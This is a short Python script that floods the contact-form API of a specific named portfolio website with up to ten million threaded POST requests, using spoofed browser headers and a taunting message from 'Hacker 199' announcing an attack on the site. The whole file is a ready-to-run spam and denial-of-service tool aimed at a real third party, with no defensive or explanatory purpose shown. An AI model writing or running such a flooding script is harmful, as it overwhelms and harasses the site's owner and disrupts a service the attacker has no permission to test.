import threading
import requests


def send_contact():
    url = "https://mvportfolio-vm0w.onrender.com/api/contact"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,sw;q=0.8",
        "content-type": "application/json",
        "priority": "u=1, i",
        "sec-ch-ua": "\"Google Chrome\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "referer": "https://bensidneyndunguportfolio.vercel.app/",
    }
    payload = {
        "name": "Hacker 199",
        "email": "Hacker199@gmail.com",
        "message": "I have decided to attack your site bro, Make sure it is fully secure coz i will attack again!!!!!",
    }

    response = requests.post(url, headers=headers, json=payload, timeout=15)
    print(response.status_code)
    print(response.text)


def concurrent_requests_in_chunks(total_requests, chunk_size):
    try:
        for i in range(0, total_requests, chunk_size):
            chunk = min(chunk_size, total_requests - i)
            threads = []
            for _ in range(chunk):
                thread = threading.Thread(target=send_contact, args=())
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
            print(f'Processed chunk {i // chunk_size + 1}/{(total_requests + chunk_size - 1) // chunk_size}')
        print(f'All {total_requests} requests completed.')
    except Exception as e:
        print('An error occurred:', e)


# Adjust the values of the following variables as needed
total_requests = 10000000  # Maximum number of requests
chunk_size = 10  # Number of requests in each chunk


concurrent_requests_in_chunks(total_requests, chunk_size)